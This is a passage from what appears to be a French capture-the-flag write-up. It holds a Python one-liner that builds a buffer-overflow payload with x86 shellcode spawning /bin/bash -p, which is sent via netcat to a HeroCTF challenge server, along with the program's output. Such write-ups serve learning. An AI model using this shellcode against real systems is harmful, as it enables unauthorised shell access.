...
- La tem "one liner"
```bash
$ python2.7 -c "print('\x90'*16 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' + '\x90'*463 + '\x50\xc0\x04\x08')" > payload2
$ cat payload2 - | nc challs.heroctf.fr 7002
---------- EN DEVELOPPEMENT ----------
Quel est ton nom ?
Voici ton nombre aléatoire jeune ????????????????j
